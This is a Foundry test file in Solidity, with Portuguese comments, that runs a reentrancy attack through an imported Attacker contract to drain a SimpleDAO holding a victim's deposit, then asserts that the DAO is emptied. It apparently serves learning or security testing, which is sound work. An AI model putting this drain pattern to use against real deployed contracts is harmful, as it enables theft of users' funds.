// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/SimpleDAO.sol";
import "../src/Attacker.sol";

contract DaoAttackTest is Test {
    SimpleDAO dao;
    Attacker attacker;

    address attackerEOA = address(0xA11CE);
    address victim = address(0xBEEF);

    function setUp() public {
        dao = new SimpleDAO();

        // Dá saldo inicial pros dois endereços
        vm.deal(attackerEOA, 1 ether);
        vm.deal(victim, 100 ether);

        // Vítima deposita 10 ETH na DAO
        vm.startPrank(victim);
        dao.deposit{value: 10 ether}();
        vm.stopPrank();
    }

    function testReentrancyAttack() public {
        // Atacante EOA cria o contrato atacante
        vm.startPrank(attackerEOA);
        attacker = new Attacker(address(dao));

        // Atacante envia 1 ETH para o atacante iniciar o ataque
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerBalanceAfter = attackerEOA.balance;

        emit log_named_uint("DAO balance after attack", daoBalanceAfter);
        emit log_named_uint("Attacker EOA balance after attack", attackerBalanceAfter);

        // O atacante deve ter MUITO mais que o 1 ETH que colocou
        assertGt(attackerBalanceAfter, 1 ether);

        // A DAO deveria ter sido drenada
        assertLt(daoBalanceAfter, 1 ether);
    }
}
